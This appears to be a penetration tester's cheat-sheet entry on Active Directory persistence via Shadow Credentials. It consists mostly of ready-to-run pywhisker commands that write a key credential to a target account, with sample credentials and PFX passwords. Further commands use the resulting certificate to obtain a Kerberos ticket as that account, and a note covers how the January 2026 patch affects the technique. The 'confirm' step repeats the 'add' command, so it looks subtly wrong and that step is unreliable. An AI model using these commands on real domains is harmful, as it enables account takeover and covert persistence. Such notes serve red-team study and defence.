# Persistence

## Shadow Credentials

### Execution

```bash
# generate pfx and add public cert to msDS-KeyCredentialLink of a --target (make sure to save the outputed password)
python pywhisker.py -d "$FQDN_DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET_SAMNAME" --action "add"
python pywhisker.py -d 'contoso.org' -u 'TestAcc' -p 'win2016-cli-P@$swd' --target 'AltAdmLocal' --action 'add'
# [+] Saved PFX (#PKCS12) certificate & key at path: 4CHGOm7F.pfx
# [*] Must be used with password: QVcxLbcT0YdVbGDXqQG5

# confirm that msDS-KeyCredentialLink is added
python pywhisker.py -d "$FQDN_DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET_SAMNAME" --action "add"


# use this pfx cert/key pair to request a TGT
# grep the password from `pywhisker add` command and put into -pfx-pass
gettgtpkinit $DOMAIN/$USER -cert-pfx $PFX_FILE -pfx-pass $PASSWORD_FOR_PFX -dc-ip $KDC $OUTPUT.ccache
python3 ./PKINITtools/gettgtpkinit.py contoso.org/AltAdmLocal -cert-pfx ../pywhisker/4CHGOm7F.pfx -pfx-pass QVcxLbcT0YdVbGDXqQG5 -dc-ip 192.168.68.179 AltAdmLocal.ccache
```

### Notes

- 01.2026 Shadow Creds do not work anymore with the January Patch. However the issue related to Microsoft removing the permissions from the computer object to write to the `ms-DS-Key-Credential-Link` attribute. If you grant the computer object the permissions back, then the relaying works as before.
